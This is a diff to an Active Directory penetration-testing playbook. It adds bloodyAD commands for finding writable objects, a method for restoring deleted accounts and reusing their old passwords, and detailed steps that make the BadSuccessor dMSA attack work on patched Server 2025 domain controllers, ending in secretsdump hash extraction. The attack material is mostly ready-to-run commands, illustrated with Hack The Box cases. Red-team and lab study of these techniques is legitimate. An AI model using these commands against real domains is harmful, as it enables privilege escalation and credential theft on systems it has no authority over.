@@ -12,46 +12,7 @@ For MSF-equivalent modules (auxiliary/admin/kerberos/get_ticket, NTLM relay, pay
 
 ---
 
-## Table of Contents
-
-- [Phase 1: External Reconnaissance (No Credentials)](#phase-1-external-reconnaissance-no-credentials)
-- [Phase 2: Authenticated Enumeration](#phase-2-authenticated-enumeration)
-- [Phase 3: Credential Attacks](#phase-3-credential-attacks)
-  - [3.1 Kerberoasting](#31-kerberoasting)
-- [Phase 4: ACL-Based Attacks](#phase-4-acl-based-attacks)
-  - [4.1 Attack Matrix](#41-attack-matrix)
-- [Phase 5: Delegation Attacks](#phase-5-delegation-attacks)
-  - [5.2.5 BronzeBit (CVE-2020-17049)](#525-bronzebit-cve-2020-17049)
-  - [5.3 Resource-Based Constrained Delegation (RBCD)](#53-resource-based-constrained-delegation-rbcd)
-- [Phase 6: AD CS (Active Directory Certificate Services) Attacks](#phase-6-ad-cs-active-directory-certificate-services-attacks)
-  - [6.2 ESC1 — Misconfigured Certificate Templates](#62-esc1-misconfigured-certificate-templates)
-- [Phase 7: Advanced AD CS Attacks](#phase-7-advanced-ad-cs-attacks)
-- [Phase 8: GMSA & LAPS Extraction](#phase-8-gmsa--laps-extraction)
-- [Phase 9: Trust Attacks](#phase-9-trust-attacks)
-- [Phase 10: Domain Compromise](#phase-10-domain-compromise)
-  - [10.1 DCSync](#101-dcsync)
-  - [10.4b Sapphire Ticket — AES-Forged Golden TGT (Detection Evader)](#104b-sapphire-ticket--aes-forged-golden-tgt-detection-evader)
-  - [10.9 krbtgt Rollover Mechanics — Golden Ticket Viability After Reset](#109-krbtgt-rollover-mechanics--golden-ticket-viability-after-reset)
-  - [10.10 DCSync via Raw MS-DRSR (EDR Evasion Path)](#1010-dcsync-via-raw-ms-drsr-edr-evasion-path)
-- [Phase 11: Coercion Attacks](#phase-11-coercion-attacks)
-  - [11.0 Coerce → Relay → Result Decision Table](#110-coerce--relay--result-decision-table)
-- [Phase 12: Exchange / Mail Server Attacks](#phase-12-exchange--mail-server-attacks)
-- [Phase 13: SCCM / MECM Attacks](#phase-13-sccm--mecm-attacks)
-- [Phase 14: WSUS Attacks](#phase-14-wsus-attacks)
-
-**Decision Tables & Quick References** (highest-density mid-engagement reference content):
-
-- [Quick Reference: "I Have Creds — What Now?" (AD Flow)](#quick-reference-i-have-creds--what-now-ad-flow)
-- [Quick Reference: BloodHound Edge → Action](#quick-reference-bloodhound-edge--action)
-- [Quick Reference: Common Attack Chains](#quick-reference-common-attack-chains)
-- [Quick Reference: Hashcat Modes for AD Hashes](#quick-reference-hashcat-modes-for-ad-hashes)
-- [Quick Reference: AD Tool Cheatsheet](#quick-reference-ad-tool-cheatsheet)
-- [Quick Reference: Common AD Misconfigurations to Check](#quick-reference-common-ad-misconfigurations-to-check)
-- [Quick Reference: Metasploit Modules for AD/Windows](#quick-reference-metasploit-modules-for-adwindows)
-- [LOTL Quick Reference](#lotl-quick-reference)
-
 > Note: subsection numbers `Nb` / `Nc` (e.g. 2.4b, 6.2b, 6.2c, 11.5b) are LOTL alternates inserted next to their primary technique without renumbering siblings. Phase 7 ESC numbers reflect upstream taxonomy ordering, not file order — see the 7.X mapping in 6.1 enumeration table.
-
 ---
 
 ## Phase 1: External Reconnaissance (No Credentials)
@@ -562,6 +523,31 @@ rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' --hashes 'aad3b435b51404eeaad3b435
 # - Principals with DCSync rights
 # - Outbound Object Control from owned principals
 ```
+
+### 2.1.1 bloodyAD — ACL & Object Recon (no BloodHound needed)
+> When BloodHound collection is blocked (LDAP signing/LDAPS reset), incomplete, or you suspect **hidden objects** (BloodHound does NOT collect `CN=Deleted Objects`), `bloodyAD` reads live signed LDAP and answers "what can *I* touch?" directly. This is what surfaces edges SharpHound/BHCE miss.
+
+```bash
+B="--host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>'"
+
+# THE key recon command — every object the current principal can write/own, attr-by-attr
+bloodyAD $B get writable
+bloodyAD $B get writable --detail          # include the specific writable attributes
+
+# Inbound DACL of a single object — who controls it (resolve SIDs + decode the SDDL)
+bloodyAD $B get object '<TARGET_SAM_or_DN>' --resolve-sd
+
+# Generic search / specific attributes (SPNs, UAC, members, delegation, links)
+bloodyAD $B get search --filter '(objectClass=user)' --attr sAMAccountName,servicePrincipalName,userAccountControl
+bloodyAD $B get object '<USER>' --attr msDS-AllowedToActOnBehalfOfOtherIdentity,msDS-KeyCredentialLink
+
+# Children of an OU / find empty staging OUs (dMSA / BadSuccessor recon — see §5.4)
+bloodyAD $B get children --target 'OU=<OU>,DC=<DOMAIN>,DC=<TLD>'
+
+# Over SOCKS (pivot): bloodyAD -s socks5://127.0.0.1:1080 ...   (faster/saner than proxychased BloodHound)
+```
+
+> **Why it wins over BloodHound here:** `get writable` enumerated a `GenericWrite` edge onto a deleted tombstoned user that no SharpHound/BHCE run shows (deleted objects aren't collected). `--resolve-sd` then confirmed exactly which attributes were writable. Treat `bloodyAD get writable` as a first-class recon step alongside BloodHound, not just an abuse tool.
 
 ### 2.2 NetExec Enumeration
 ```bash
@@ -1660,6 +1646,8 @@ bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' \
 
 > **🟡 OPSEC:** `Restore-ADObject` writes EID `5136` (directory service object modified) on the DC with `Operation: Value Added` for every attribute restored — distinctive event chain. EID `5141` (object deleted) precedes the original tombstone; the restore is the inverse pattern and most XDR rules detect it.
 
+> **🔎 Finding the tombstone in the first place — `bloodyAD get writable`.** BloodHound does **not** collect `CN=Deleted Objects`, so a `GenericWrite`/`Reanimate-Tombstones` edge onto a deleted account is invisible in the graph. The discovery path that works: run `bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p <PASS> get writable` — a writable DN containing `\0ADEL:<GUID>,CN=Deleted Objects` is the tell. Then enumerate with the show-deleted controls (`-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065`) and restore with `bloodyAD ... set restore '<sAMAccountName>'` (cleaner than the `set object ... isDeleted -v ''` form). The restored object keeps its **pre-deletion password** — test it immediately (`nxc smb ... -u <user> -p <oldpass>`). *(Seen on Checkpoint HTB: alex.turner → restored `mark.davies` → that account was the only principal able to write the privileged file share that led to RCE.)*
+
 [↑ Back to top](#active-directory-penetration-testing-methodology)
 
 ---
@@ -2073,6 +2061,31 @@ export KRB5CCNAME=attacker_dMSA\$.ccache
 proxychains impacket-secretsdump -k -no-pass \
   '<DOMAIN>/attacker_dMSA$@dc01.<DOMAIN>' -just-dc-ntlm -dc-ip <DC_IP>
 ```
+
+#### 5.4.1 Patched-DC notes & gotchas (build ≥ 26100.4946, post-Aug-2025)
+
+On fully-patched Server 2025 the attack still works but the naive path silently fails — the dMSA TGS comes back with **no `KERB-DMSA-KEY-PACKAGE`** (decrypted EncKDCRepPart has no `encrypted-pa-data` / tag-12), so tools NRE or print nothing. Three things to get right:
+
+```text
+1. /opsec IS MANDATORY.  Rubeus asktgs ... /dmsa WITHOUT /opsec sends a non-forwardable request and the
+   patched KDC withholds the key package. WITH /opsec it is released. (impacket getST -dmsa may throw
+   KRB_ERR_GENERIC on S4U2self vs patched DCs — prefer Rubeus /opsec, or a current build.)
+
+2. SET THE MIGRATION LINKS VIA RAW LDAP, NOT ADSI.  PowerShell [ADSI].Put()+SetInfo() and Set-ADObject
+   report Success but the DC silently drops writes to msDS-SupersededManagedAccountLink /
+   msDS-ManagedAccountPrecededByLink. Use System.DirectoryServices.Protocols ModifyRequest (LDAP modify),
+   bloodyAD `set object`, or impacket — these persist. Verify with a separate read before the ticket request.
+   Required state (mutual pairing / "BetterSuccessor"):
+     dMSA:    msDS-ManagedAccountPrecededByLink = <TARGET_DN> ; msDS-DelegatedMSAState = 2
+     TARGET:  msDS-SupersededManagedAccountLink = <dMSA_DN>   ; msDS-SupersededServiceAccountState = 2
+
+3. TARGET MUST BE WRITABLE.  Setting the reciprocal link on the *target* needs write on it. Administrator
+   is usually not writable from a low-priv foothold — but a target you already have GenericWrite on works.
+   (Checkpoint HTB: ryan.brooks had GenericWrite on svc_deploy → superseded svc_deploy, not Administrator,
+    extracting svc_deploy's NT hash from the dMSA "previous-keys" in the asktgs output.)
+```
+
+> If the packaged Rubeus NREs on the key package, build a current one from GhostPack source (older builds mis-parse the `SEQUENCE OF EncryptionKey`). `Invoke-BadSuccessor2.0.ps1` (b5null) does the mutual pairing automatically. **Recon:** find the vulnerable OU with `bloodyAD ... get writable` (look for `CREATE_CHILD`) or the BloodHound CreateChild edge — an **empty staging OU** (e.g. `DMSAHolder`) where you hold CreateChild is the classic signpost.
 
 ### 5.5 Kerberos Double-Hop Bypass via CredSSP
 
